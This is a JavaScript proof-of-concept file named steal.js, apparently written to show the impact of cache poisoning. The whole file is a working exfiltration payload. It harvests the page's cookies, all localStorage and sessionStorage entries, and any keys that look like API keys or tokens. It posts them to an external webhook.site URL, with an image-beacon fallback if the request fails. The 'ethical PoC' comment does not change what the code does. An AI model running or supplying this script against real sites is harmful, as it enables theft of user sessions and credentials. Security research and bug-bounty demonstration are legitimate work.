// steal.js - Data Exfiltration PoC
// Webhook: https://webhook.site/04a0f607-8cea-42e8-94c8-828afff2780d
// Purpose: Demonstrate cache poisoning impact

(function() {
  console.log('[PoC] Exfiltration script loaded');
  
  // Collect all available data
  const collectedData = {
    timestamp: new Date().toISOString(),
    url: window.location.href,
    domain: window.location.hostname,
    
    // Cookies
    cookies: document.cookie,
    
    // Local Storage
    localStorage: {},
    
    // Session Storage  
    sessionStorage: {},
    
    // Common sensitive keys
    apiKeys: [],
    tokens: [],
    
    // User info
    userAgent: navigator.userAgent,
    language: navigator.language,
    
    // Page info
    title: document.title,
    referrer: document.referrer
  };
  
  // Extract localStorage
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      collectedData.localStorage[key] = localStorage.getItem(key);
      
      // Look for API keys
      if (key.toLowerCase().includes('api') || 
          key.toLowerCase().includes('key') ||
          key.toLowerCase().includes('token')) {
        collectedData.apiKeys.push({
          key: key,
          value: localStorage.getItem(key)
        });
      }
    }
  } catch(e) {
    console.log('[PoC] localStorage access denied:', e);
  }
  
  // Extract sessionStorage
  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      collectedData.sessionStorage[key] = sessionStorage.getItem(key);
    }
  } catch(e) {
    console.log('[PoC] sessionStorage access denied:', e);
  }
  
  // Look for password fields (ethical PoC - just detect, don't capture)
  const passwordFields = document.querySelectorAll('input[type="password"]');
  collectedData.passwordFieldsPresent = passwordFields.length > 0;
  
  // Look for form data
  const forms = document.querySelectorAll('form');
  collectedData.formsPresent = forms.length;
  
  console.log('[PoC] Collected data:', collectedData);
  
  // Send to YOUR webhook
  const WEBHOOK_URL = 'https://webhook.site/04a0f607-8cea-42e8-94c8-828afff2780d';
  
  // Method 1: Fetch API (modern, clean)
  fetch(WEBHOOK_URL, {
    method: 'POST',
    mode: 'cors',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(collectedData)
  })
  .then(response => {
    console.log('[PoC] Data exfiltrated successfully:', response.status);
  })
  .catch(error => {
    console.log('[PoC] Exfiltration failed:', error);
    
    // Fallback: Image beacon (works even if fetch blocked)
    const img = new Image();
    img.src = WEBHOOK_URL + '?data=' + encodeURIComponent(JSON.stringify(collectedData));
  });
  
  // Visual proof (for screenshots)
  if (collectedData.apiKeys.length > 0) {
    console.warn('[PoC] FOUND API KEYS:', collectedData.apiKeys);
    
    // Optional: Show alert for PoC demonstration
    // Uncomment next line to show alert:
    // alert('PoC: Found ' + collectedData.apiKeys.length + ' API key(s)');
  }
  
})();
